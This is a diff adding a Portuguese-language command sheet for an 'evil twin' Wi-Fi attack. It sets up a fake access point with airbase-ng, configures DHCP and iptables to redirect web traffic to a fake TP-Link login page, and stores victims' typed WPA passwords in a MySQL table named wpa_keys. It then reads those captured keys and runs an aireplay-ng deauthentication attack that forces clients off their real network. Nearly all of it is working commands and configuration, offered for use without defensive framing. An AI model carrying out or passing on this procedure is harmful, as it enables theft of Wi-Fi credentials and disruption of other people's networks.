@@ -1,0 +1,85 @@
+Linha de comando:
+
+Mostrando dispositivos de rede:
+
+# ifconfig
+
+Ativando interface de monitoramento:
+
+# airmon-ng start wlan0
+
+Monitorando o ar:
+
+# airodump-ng wlan0mon
+
+Criando falso AP:
+
+# airbase-ng -e <nome_da_rede_falsa> -c <canal> -P wlan0mon
+
+ 
+
+Configurar interface at0:
+
+# ifconfig at0 up# ifconfig at0 192.168.2.1/24
+
+Configurar rotas:
+
+# route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
+
+Instalando servidor DHCP:
+
+# apt-get install isc-dhcp-server
+
+Criando arquivo de configuração DHCP:
+
+# nano /etc/dhcpd.conf
+
+Conteúdo arquivo dhcpd.conf:
+
+authoritative;default-lease-time 600;max-lease-time 7200;subnet 192.168.2.0 netmask 255.255.255.0 {option subnet-mask 255.255.255.0;option broadcast-address 192.168.2.255;option routers 192.168.2.1;option domain-name-servers 8.8.8.8;range 192.168.2.100 192.168.2.175; }
+
+Iniciar servidor DHCP:
+
+# dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0# /etc/init.d/isc-dhcp-server start
+
+Habilitar IP Forwarding:
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Regras IPTables:
+
+iptables --flushiptables --table nat --flushiptables --delete-chainiptables --table nat --delete-chainiptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADEiptables --append FORWARD --in-interface at0 -j ACCEPTiptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <ip local>:80iptables -t nat -A POSTROUTING -j MASQUERADE
+
+Iniciando Apache (Servidor Web):
+
+# service apache2 start
+
+Pasta para arquivos do apache:
+
+# cd /var/www
+
+Faça o Download da página Fake TP-Link (Link no final da página)
+
+Descompacte na pasta: /var/www/
+
+# unzip eviltwin.zip
+
+Iniciando servidor MySQL (Banco de dados):
+
+# service mysql start
+
+Conectando-se ao banco de dados MySQL:
+
+# mysql -u root
+
+Criando banco de dados e tabelas necessárias para a página fake:
+
+CREATE database evil_twin;USE evil_twin;CREATE TABLE wpa_keys(password varchar(64), confirm varchar(64));
+
+Verificando senhas capturadas:
+
+USE evil_twin;SELECT * FROM wpa_keys;
+
+Ataque de desautenticação:
+
+# aireplay-ng -0 <numero de repeticoes do ataque> -a <bssid> wlan0mon
